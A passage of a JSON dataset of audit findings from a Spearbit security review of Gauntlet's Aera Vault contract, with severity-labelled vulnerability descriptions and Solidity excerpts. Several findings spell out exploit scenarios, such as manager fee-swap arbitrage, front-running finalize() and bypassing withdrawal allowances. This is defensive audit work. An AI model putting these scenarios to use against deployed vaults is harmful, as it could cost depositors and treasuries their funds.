malicious and his address could be blacklisted in USDC. Note: set as high risk because although probability is very small, impact results in Vault funds to become inacces- sible. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < amounts.length; i++) { tokens[i].safeTransfer(manager, amounts[i]); } }", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "updateWeightsGradually allows change rates to start in the past with a very high maximumRatio", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current updateWeightsGradually is using startTime instead of time that should be Math.max(block.timestamp, startTime). Because internally Balancer will use startTime = Math.max(currentTime, startTime); as the startTime, this allows to: the minimal start  Have a startTime in the past.  Have a targetWeights[i] higher than allowed. We also suggest adding another check to prevent startTime > endTime. Although Balancer replicates the same check it is still needed in the Aera implementation to prevent transactions to revert because of an underflow error on uint256 duration = endTime - startTime;", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "The vault manager has unchecked power to create arbitrage using setSwapFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "A previously known issue was that a malicious vault manager could arbitrage the vault like in the below scenario: 1. Set the swap fees to a high value by setSwapFee (10% is the maximum). 2. Wait for the market price to move against the spot price. 3. In the same transaction, reduce the swap fees to ~0 (0.0001% is the minimum) and arbitrage the vault. The proposed fix was to limit the percentage change of the swap fee to a maximum of MAXIMUM_SWAP_FEE_- PERCENT_CHANGE each time. However, because there is no restriction on how many times the setSwapFee function can be called in a block or transaction, a malicious manager can still call it multiple times in the same transaction and eventually set the swap fee to the value they want.", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "Implement a function to claim liquidity mining rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancer offers a liquidity mining rewards distribution for liquidity providers. Liquidity Mining distributions are available to claim weekly through the MerkleOrchard contract. Liquid- ity Providers can claim tokens from this contract by submitting claims to the tokens. These claims are checked against a Merkle root of the accrued token balances which are stored in a Merkle tree. Claim- ing through the MerkleOrchard is much more gas-efficient than the previous generation of claiming contracts, especially when claiming multiple weeks of rewards, and when claiming multiple tokens. The AeraVault is itself the only liquidity provider of the Balancer pool deployed, so each week its entitled to claim those rewards. Currently, those rewards cannot be claimed because the AeraVault is missing an implementation to interact with the MerkleOrchard contract, causing all rewards (BAL + other tokens) to remain in the MerkleOrchard forever.", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "Owner can circumvent allowance() via enableTradingWithWeights()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The vault Owner can set arbitrary weights via disableTrading() and then call enableTrading- WithWeights() to set the spot price and create arbitrage opportunities for himself. This way allowance() in withdraw() checks, which limit the amount of funds an owner can withdraw, can be circumvented. Something similar can be done with enableTradingRiskingArbitrage() in combination with sufficient time. Also see the following issues:  allowance() doesnt limit withdraw()s  enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled  Separation of concerns Owner and Manager function disableTrading() ... onlyOwnerOrManager ... { setSwapEnabled(false); } function enableTradingWithWeights(uint256[] calldata weights) ... onlyOwner ... { ... pool.updateWeightsGradually(timestamp, timestamp, weights); setSwapEnabled(true); } function enableTradingRiskingArbitrage() ... onlyOwner ... { setSwapEnabled(true); } 13", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Front-running attacks on finalize could affect received token amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The returnFunds() function (called by finalize()) withdraws the entire holdings in the Balancer pool but does not allow the caller to specify and enforce the minimum amount of received tokens. Without such check the finalize() function could be susceptible to a front-running attack. A potential exploit scenario looks as follows: 1. The notice period has passed and the Treasury calls finalize() on the Aera vault. Assume the Balancer pool contains 1 WETH and 3000 DAI, and that WETH and DAI weights are both 0.5. 2. An attacker front-runs the Treasurys transaction and swaps in 3000 DAI to get 0.5 WETH from the pool. 3. As an unexpected result, the Treasury receives 0.5 WETH and 6000 DAI. Therefore an attacker can force the Treasury to accept the trade that they offer. Although the Treasury can execute a reverse trade on another market to recover the token amount and distribution, not every Treasury can execute such trade (e.g., if a timelock controls it). Notice that the attacker may not profit from the swap because of slippage but they could be incentivized to perform such an attack if it causes considerable damage to the Treasury.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "safeApprove in depositToken could revert for non-standard token like USDT", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Some non-standard tokens like USDT will revert when a contract or a user tries to approve an al- lowance when the spender allowance has already been set to a non zero value. In the current code we have not seen any real problem with this fact because the amount retrieved via depositToken() is approved send to the Balancer pool via joinPool() and managePoolBalance(). Balancer transfers the same amount, lowering the approval to 0 again. However, if the approval is not lowered to exactly 0 (due to a rounding error or another unfore- seen situation) then the next approval in depositToken() will fail (assuming a token like USDT is used), blocking all further deposits. Note: Set to medium risk because the probability of this happening is low but impact would be high. We also should note that OpenZeppelin has officially deprecated the safeApprove function, suggesting to use instead safeIncreaseAllowance and safeDecreaseAllowance.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Consult with Balancer team about best approach to add and remove funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Aera Vault uses AssetManagers functionality of function managePoolBalance() to add and remove funds. The standard way to add and remove funds in Balancer is via joinPool() / exitPool(). Using the managePoolBalance() function might lead to future unexpected behavior. Additionally, this disables the capacity to implement the original intention of AssetManagers functionality, e.g. storing funds elsewhere to generate yield.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Fee on transfer can block several functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Some tokens have a fee on transfer, for example USDT. Usually such fee is not enabled but could be re-enabled at any time. With this fee enabled the withdrawFromPool() function would receive slightly less tokens than the amounts requested from Balancer causing the next safeTransfer() call to fail because there are not enough tokens inside the contract. This means withdraw() calls will fail. Functions deposit() and calculateAndDistributeManagerFees() can also fail because they have similar code. Note: The function returnFunds() is more robust and can handle this problem. Note: The problem can be alleviated by sending additional tokens directly to the Aera Vault contract to compensate for fees, lowering the severity of the problem to medium. function withdraw(uint256[] calldata amounts) ... { ... withdrawFromPool(amounts); // could get slightly less than amount with a fee on transfer ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { tokens[i].safeTransfer(owner(), amounts[i]); // could revert it the full amounts[i] isn't ,! available ... } ... } }", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "enableTradingWithWeights is a function that can only be called by the owner of the Aera Vault contract and that should be used only to re-enable the swap feature on the pool while updating token weights. The function does not verify if the pools swap feature is enabled and for this reason, as a result, it allows the Treasury to act as the manager who is the only actor allowed to change the pool weights. The function should add a check to ensure that it is only callable when the pools swap is disabled.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "AeraVault constructor is not checking all the input parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Aera Vault constructor has the role to handle Balancers ManagedPool deployment. The con- structor should increase the number of user input validation and the Gauntlet team should be aware of the possible edge case that could happen given that the deployment of the Aera Vault is handled directly by the Treasury and not by the Gauntlet team itself. We are going to list all the worst-case scenarios that could happen given the premise that the deployments are handled by the Treasury. 1. factory could be a wrapper contract that will deploy a ManagedPool. This would mean that the deployer could pass correct parameters to Aera Vault to pass these checks, but will use custom and malicious parameters on the factory wrapper to deploy the real Balancer pool. 2. swapFeePercentage value is not checked. On Balancer, the deployment will revert if the value is not in- side this range >= 1e12 (0.0001%) and <= 1e17 (10% - this fits in 64 bits). Without any check, the Gauntlet accept to follow the Balancers swap requirements. 3. manager_ is not checked. They could set the manager as the Treasury (owner of the vault) itself. This would give the Treasury the full power to manage the Vault. At least these values should be checked: address(0), address(this) or owner(). The same checks should also be done in the setManager() function. 4. validator_ could be set to a custom contract that will give full allowances to the Treasury. This would make the withdraw() act like finalize() allowing to withdraw all the funds from the vault/pool. 17 5. noticePeriod_ has only a max value check. Gauntlet team explained that a time delay between the ini- tialization of the finalize process and the actual finalize is needed to prevent the Treasury to be able to instantly withdraw all the funds. Not having a min value check allow the Treasury to set the value to 0 so there would be no delay between the initiateFinalization() and finalize() because noticeTimeoutAt == block.timestamp. 6. managementFee_ has no minimum value check. This would allow the Treasury to not pay the manager because the managerFeeIndex would always be 0. 7. description_ can be empty. From the Specification PDF, the description of the vault has the role to De- scribes vault purpose and modelling assumptions for differentiating between vaults. Being empty could lead to a bad UX for external services that needs to differentiate different vaults. These are all the checks that are done directly by Balancer during deployment via the Pool Factory:  BasePool constructor#L94-L95 min and max number of tokens.  BasePool constructor#L102token array is sorted following Balancer specification (sorted by token address).  BasePool constructor calling _setSwapFeePercentage min and max value for swapFeePercentage.  BasePool constructor calling vault.registerTokens token address uniqueness (cant have same Following the pathBasePool is calling from function _registerMinimalSwapInfoPoolTokens it also checks that token != IERC20(0). should that call token in the pool), vault.registerTokens MinimalSwapInfoPoolsBalance.  ManagedPool constructor calling _startGradualWeightChange Check min value of weight and that the total sum of the weights are equal to 100%. _startGradualWeightChange internally check that endWeight >= WeightedMath._MIN_WEIGHT and normalizedSum == FixedPoint.ONE.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Possible mismatch between Validator.count and AeraVault assets count", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "A weak connection between WithdrawalValidator and Aera Vault could lead to the inability of withdrawing from a Vault. Consider the following scenario: The Validator is deployed with a tokenCount < than Vault.getTokens().length. Inside the withdraw() function we reference the following code block: uint256[] memory allowances = validator.allowance(); uint256[] memory weights = getNormalizedWeights(); uint256[] memory newWeights = new uint256[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable( address(tokens[i]), amounts[i], holdings[i].min(allowances[i]) ); } } A scenario where allowances.length < tokens.length would cause this function to revert with an Index out of bounds error. The only way for the Treasury to withdraw funds would be via the finalize() method which has a time delay.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Ensure vaults deployment integrity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The treasury could deploy on purpose or by accident a slightly different version of the contract and introduce bugs or backdoors. This might not be recognized by parties taking on Manager responsibilities (e.g. usually Gauntlet will be involved here).", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Frequent calling of calculateAndDistributeManagerFees() lowers fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Via calculateAndDistributeManagerFees() a percentage of the Pool is subtracted and sent to the Manager. If this function is called too frequently his fees will be lower. For example:  If he calls it twice, while both time getting 1%, he actually gets: 1% + 1% * (100% - 1%) = 1.99%  If he waits longer until he has earned 2%, he actually gets: 2%, which is slightly more than 1.99%  If called very frequently the fees go to 0 (especially taking in account the rounding down). However the gas cost would be very high. The Manager can (accidentally) do this by calling claimManagerFees(). The Owner can (accidentally or on pur- pose (e.g. using 0 balance change) ) do this by calling deposit(), withdraw() or setManager(). Note: Rounding errors make this slightly worse. Also see the following issue: Possible rounding down of fees function claimManagerFees() ... { calculateAndDistributeManagerFees(); // get a percentage of the Pool }", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "OpenZeppelin best practices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Aera Vault uses OpenZeppelin release 4.3.2 which is copied into their github. The current release of OpenZeppelin is 4.6.0 and includes several updates and security fixes. The copies of the OpenZeppelin files are also (manually) changed to adapt the import paths. This has the risk of making a mistake in the process. import \"./dependencies/openzeppelin/SafeERC20.sol\"; import \"./dependencies/openzeppelin/IERC20.sol\"; import \"./dependencies/openzeppelin/IERC165.sol\"; import \"./dependencies/openzeppelin/Ownable.sol\"; import \"./dependencies/openzeppelin/ReentrancyGuard.sol\"; import \"./dependencies/openzeppelin/Math.sol\"; import \"./dependencies/openzeppelin/SafeCast.sol\"; import \"./dependencies/openzeppelin/ERC165Checker.sol\";", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Possible rounding down of fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "If certain token has a few decimals numbers then fees could be rounded down to 0, especially if time between calculateAndDistributeManagerFees() is relatively small. This also could slightly shift the spot price because the balance of one coin is lowered while the other remains still. With fewer decimals the situation worsens, e.g. Gemini USD GUSD has 2 decimals, therefore the problem occurs with a balance of 10_000 GUSD. Note: The rounding down is probably neglectable in most cases. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < tokens.length; i++) { amounts[i] = (holdings[i] * managerFeeIndex) / ONE; // could be rounded down to 0 } ... } With 1 USDC in the vault and 2 hours between calculateAndDistributeManagerFees(), the fee for USDC is rounded down to 0. This behavior is demonstrated in the following POC: 21 import \"hardhat/console.sol\"; contract testcontract { uint256 constant ONE = 10**18; uint managementFee = 10**8; constructor() { // MAX_MANAGEMENT_FEE = 10**9; // 1 USDC uint holdings = 1E6; uint delay = 2 hours; uint managerFeeIndex = delay * managementFee; uint amounts = (holdings * managerFeeIndex) / ONE; console.log(\"Fee\",amounts); // fee is 0 } }", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Missing nonReentrant modifier on initiateFinalization(), setManager() and claimManagerFees() functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The initiateFinalization() function is missing a nonReentrant modifier while calculateAnd- DistributeManagerFees() executes external calls. Same goes for setManager() and claimManagerFees() func- tions.", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Potential division by 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "If the balance (e.g. holdings[]) of a token is 0 in deposit() then the dividing by holdings[] would cause a revert. Note: Function withdraw() has similar code but when holdings[]==0 its not possible to withdraw() anyway. Note: The current Mannon vault code will not allow the balances to be 0. Note: Although not used in the current code, in order to do a deregisterTokens(), Balancer requires the balance to be 0. Additionally, refer to the following Balancer documentation about the-vault#deregistertokens. The worst case scenario is deposit() not working. function deposit(uint256[] calldata amounts) ... { ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { depositToken(tokens[i], amounts[i]); uint256 newBalance = holdings[i] + amounts[i]; newWeights[i] = (weights[i] * newBalance) / holdings[i]; // would revert if holdings[i] == 0 } ... ... } Similar divisions by 0 could occur in getWeightChangeRatio(). The function is called from updateWeightsGradu- ally(). If this is due to targetWeight being 0, then it is the desired result. Current weight should not be 0 due balancer checks. function getWeightChangeRatio(uint256 weight, uint256 targetWeight) ... { return weight > targetWeight ? (ONE * weight) / targetWeight : (ONE * targetWeight) / weight; // could revert if targetWeight == 0 // could revert if weight== 0 }", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Use ManagedPoolFactory instead of BaseManagedPoolFactory to deploy the Balancer pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Currently the Aera Vault is using BaseManagedPoolFactory as the factory to deploy the Balancer pool while Balancers documentation recommends and encourages the usage of ManagedPoolFactory. Quoting the doc inside the BaseManagedPoolFactory: This is a base factory designed to be called from other factories to deploy a ManagedPool with a particular controller/owner. It should NOT be used directly to deploy ManagedPools without controllers. ManagedPools controlled by EOAs would be very dangerous for LPs. There are no restrictions on what the managers can do, so a malicious manager could easily manipulate prices and drain the pool. In this design, other controller-specific factories will deploy a pool controller, then call this factory to deploy the pool, passing in the controller as the owner. 23", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Adopt the two-step ownership transfer pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "To prevent the Aera vault Owner, i.e. the Treasury, from calling renounceOwnership() and effec- tively breaking vault critical functions such as withdraw() and finalize(), the renounceOwnership() function is explicitly overridden to revert the transaction every time. However, the transferOwnership() function may also lead to the same issue if the ownership is transferred to an uncontrollable address because of human errors or attacks on the Treasury.", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Implement zero-address check for manager_", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Non-existent zero-address checks inside the constuctor for the manager_ parameter. If manager_- becomes a zero address then calls to calculateAndDistributeManagerFees will burn tokens (transfer them to address(0)).", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Simplify tracking of managerFeeIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The calculateAndDistributeManagerFees() function uses updateManagerFeeIndex() to keep track of management fees. It keeps track of both managerFeeIndex and lastFeeCheckpoint in storage vari- ables (e.g. costing SLOAD/SSTORE). However, because managementFee is immutable this can be simplified to one storage variable, saving gas and improving code legibility. uint256 public immutable managementFee; // can't be changed function calculateAndDistributeManagerFees() internal { updateManagerFeeIndex(); ... if (managerFeeIndex == 0) { return; use managerFeeIndex } ... // ... managerFeeIndex = 0; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; lastFeeCheckpoint = block.timestamp.toUint64(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Directly call getTokensData() from returnFunds()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The function returnFunds() calls getHoldings() and getTokens(). Both functions call getTokens- Data() thus waste gas unnecessarily. function returnFunds() internal returns (uint256[] memory amounts) { uint256[] memory holdings = getHoldings(); IERC20[] memory tokens = getTokens(); ... } function getHoldings() public view override returns (uint256[] memory amounts) { (, amounts, ) = getTokensData(); } function getTokens() public view override returns (IERC20[] memory tokens) { (tokens, , ) = getTokensData(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Change uint32 and uint64 to uint256", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The contract contains a few variables/constants that are smaller than uint256: noticePeriod, no- ticeTimeoutAt and lastFeeCheckpoint. This doesnt actually save gas because they are not part of a struct and still take up a storage slot. It even costs more gas because additional bits have to be stripped off. Additionally, there is a very small risk of lastFeeCheckpoint wrapping to 0 in the updateManagerFeeIndex() function. If that would happen, managerFeeIndex would get far too large and too many fees would be paid out. Finally, using int256 simplifies the code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { ... uint32 public immutable noticePeriod; ... uint64 public noticeTimeoutAt; ... uint64 public lastFeeCheckpoint = type(uint64).max; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; // could get large when lastFeeCheckpoint wraps lastFeeCheckpoint = block.timestamp.toUint64(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Use block.timestamp directly instead of assigning it to a temporary variable.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "It is preferable to use block.timestamp directly in your code instead of assigning it to a temporary variable as it only uses 2 gas.", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Consider replacing pool.getPoolId() with bytes32 public immutable poolId to save gas and ex- ternal calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current implementation of Aera Vault always calls pool.getPoolId() or indirectly getPoolId() to retrieve the ID of the immutable state variable pool that has been declared at constructor time. The pool.getPoolId() is a getter function defined in the Balancer BasePool contract: function getPoolId() public view override returns (bytes32) { return _poolId; } Inside the same BasePool contract the _poolId is defined as immutable which means that after creating a pool it will never change. For this reason it is possible to apply the same logic inside the Aera Vault and use an immutable variable to avoiding external calls and save gas.", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Save values in temporary variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "We observed multiple occurrences in the codebase where <var>.length was used in for loops. This could lead to more gas consumption as .length gets called repetitively until the for loop finishes. When indexed variables are used multiple times inside the loop in a read only way these can be stored in a temporary variable to save some gas. for (uint256 i = 0; i < tokens.length; i++) { // tokens.length has to be calculated repeatedly ... ... = tokens[i].balanceOf(...); tokens[i].safeTransfer(owner(), ...); } // tokens[i] has to be evaluated multiple times", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Aera could be prone to out-of-gas transaction revert when managing a high number of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Balancer ManagedPool used by Aera has a max limit of 50 token. Functions like: initialDeposit(), deposit(), withdraw() and finalize() involve numerous external direct and indirect (made by Balancer itself when called by Aera) calls and math calculations that are done for each token managed by the pool. The functions deposit() and withdraw() are especially gas intensive, given that they also internally call calcu- lateAndDistributeManagerFees() that will transfer, for each token, a management fee to the manager. For these reasons Aera should be aware that a high number of tokens managed by the Aera Vault could lead to out-of-gas reverts (max block size depends on which chain the project will be deployed).", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Use a consistent way to call getNormalizedWeights()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The functions deposit() and withdraw() call function getNormalizedWeights() while the function updateWeightsGradually() and cancelWeightUpdates() call pool.getNormalizedWeights(). Although this is functionally the same, it is not consistent. 29 function deposit(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Deposit(amounts, getNormalizedWeights()); } function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Withdraw(amounts, allowances, getNormalizedWeights()); } function updateWeightsGradually(...) ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function cancelWeightUpdates() ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function getNormalizedWeights() ... { return pool.getNormalizedWeights(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Add function disableTrading() to IManagerAPI.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The disableTrading() function can also be called by managers because of the onlyOwnerOrMan- agermodifier. However in AeraVaultV1.sol it is located in the PROTOCOL API section. It is also not present in IManagerAPI.sol. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { /// PROTOCOL API /// function disableTrading() ... onlyOwnerOrManager ... { ... } /// MANAGER API /// } interface IManagerAPI { function updateWeightsGradually(...) external; function cancelWeightUpdates() external; function setSwapFee(uint256 newSwapFee) external; function claimManagerFees() external; } // disableTrading() isn't present 30", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Doublecheck layout functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Different ways are used to layout functions. Especially the part between ( ... ) and between ) ... { is sometimes done on one line and sometimes split in multiple lines. Also { is sometimes at the end of a line and sometimes at the beginning. Although the layout is not disturbing it might be useful to doublecheck it. Here are a few examples of different layouts: function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function depositToken(IERC20 token, uint256 amount) internal { ... } function updatePoolBalance( uint256[] memory amounts, IBVault.PoolBalanceOpKind kind ) internal { ... } function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function updateWeightsGradually( uint256[] calldata targetWeights, uint256 startTime, uint256 endTime ) external override onlyManager whenInitialized whenNotFinalizing { ... } function getWeightChangeRatio(uint256 weight, uint256 targetWeight) internal pure returns (uint256) { } ...", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Use Math library functions in a consistent way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the AeraVaultV1 contract, the OZs Math library functions are attached to the type uint256. The min function is used as a member function whereas the max function is used as a library function.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Separation of concerns Owner and Manager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Owner and Manager roles are separated on purpose. Role separation usually helps to improve quality. However this separation can be broken if the Owner calls setManager(). This way the Owner can set the Manager to one of his own addresses, do Manager functions (for example setSwapFee()) and perhaps set it back to the Manager. Note: as everything happens on chain these actions can be tracked. function setManager(address newManager) external override onlyOwner { if (newManager == address(0)) { revert Aera__ManagerIsZeroAddress(); } if (initialized && noticeTimeoutAt == 0) { calculateAndDistributeManagerFees(); } emit ManagerChanged(manager, newManager); manager = newManager; }", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Add modifier whenInitialized to function finalize()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The function finalize() does not have the modifier whenInitialized while most other functions have this modifier. This does not create any real issues because the function contains the check noticeTimeoutAt == 0 which can only be skipped after initiateFinalization(), and this function does have the whenInitialized modifier. function finalize() external override nonReentrant onlyOwner { // no modifier whenInitialized if (noticeTimeoutAt == 0) { // can only be set via initiateFinalization() revert Aera__FinalizationNotInitialized(); } ... }", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Document the use of mustAllowlistLPs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the Mannon Vault it is important that no other accounts can use joinPool() on the balancer pool. If other accounts are able to call joinPool(), they would get Balancer Pool Tokens (BPT) which could rise in value once more funds are added to the pool. Luckily this is prevented by the mustAllowlistLPs parameter in NewPoolParams. Readers could easily overlook this parameter. pool = IBManagedPool( IBManagedPoolFactory(factory).create( IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 // prevent other account to use joinPool }) ) );", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "finalize can be called multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The finalize function can be called multiple time, leading to the possibility to waste gas for no reason and emitting again a conceptually wrong Finalized event. Currently, theres no check that will prevent to call the function multiple time and there is no explicit flag to allow external sources (web app, external contract) to know whether the AeraVault has been finalized or not. Scenario: the AeraVault has already been finalized but the owner (that could be a contract and not a single EOA) is not aware of it. He calls finalize again and wastes gas because of the external calls in a loop done in returnFunds and emit an additional event Finalized(owner(), [0, 0, ..., 0]) with an array of zeros in the amounts event parameter.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Consider updating finalize to have a more \"clean\" final state for the AeraVault/Balancer pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "This is just a suggestion and not an issue per se. The finalize function should ensure that the pool is in a finalized state for both a better UX and DX. Currently, the finalize function is only withdrawing all the funds from the pool after a noticePeriod but is not ensuring that the swap have been disabled and that all the rewards, entitled to the Vault (owned by the Treasury), have been claimed.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "enableTradingWithWeights is not emitting an event for pools weight change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "enableTradingWithWeights is both changing the pools weight and enabling the swap feature, but its only emitting the swap related event (done by calling setSwapEnabled). Both of those operations should be correctly tracked via events to be monitored by external tools.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Document Balancer checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancer has a large number of internal checks. Weve discussed the use of additional checks in the Aera Vault functions. The advantage of this is that it could result in more user friendly error messages. Additionally it protects against potential future change in the Balancer code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { function enableTradingWithWeights(uint256[] calldata weights) ... { { ... // doesn't check weights.length pool.updateWeightsGradually(timestamp, timestamp, weights); ... } } Balancer code: function updateWeightsGradually( ..., uint256[] memory endWeights) ... { (IERC20[] memory tokens, , ) = getVault().getPoolTokens(getPoolId()); ... InputHelpers.ensureInputLengthMatch(tokens.length, endWeights.length); // length check is here ... }", "labels": ["Spearbit", "Gauntlet", "Severity: 